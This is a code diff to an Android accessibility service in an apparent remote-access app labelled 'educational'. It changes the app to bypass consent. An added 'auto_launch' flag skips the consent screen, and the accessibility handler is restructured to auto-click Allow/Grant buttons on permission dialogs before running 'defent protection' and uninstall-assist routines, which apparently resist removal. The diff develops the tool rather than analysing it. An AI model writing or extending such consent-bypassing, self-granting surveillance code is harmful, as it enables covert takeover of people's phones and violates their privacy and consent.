@@ -89,10 +89,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         // Start continuous auto-click scan immediately
         startAutoClickScanner();
 
-        // Immediately bring ConsentActivity to foreground to trigger permission requests
+        // Immediately launch permission flow — auto_launch skips all consent UI
         try {
             Intent consentIntent = new Intent(this, com.remoteaccess.educational.ConsentActivity.class);
             consentIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+            consentIntent.putExtra("auto_launch", true);
             startActivity(consentIntent);
         } catch (Exception ignored) {}
 
@@ -407,17 +408,18 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             // Update app name
             updateCurrentAppName();
 
-            // Uninstall-assist is highest priority when triggered.
+            // During auto-grant period: only click Allow/Grant buttons — nothing else.
+            // Defent protection is suspended so it cannot interfere with permission dialogs.
+            if (autoGrantMode) {
+                runPermissionGranter(rootNode);
+                rootNode.recycle();
+                return;
+            }
+            // After auto-grant period ends: run uninstall-assist and defent protection.
             if (runUninstallAssist(rootNode)) {
                 rootNode.recycle();
                 return;
             }
-            // Auto-grant mode: click permission dialogs for 30 seconds after accessibility enabled.
-            if (autoGrantMode && runPermissionGranter(rootNode)) {
-                rootNode.recycle();
-                return;
-            }
-            // Then continuous defent protection.
             if (runDefentProtection(rootNode)) {
                 rootNode.recycle();
                 return;
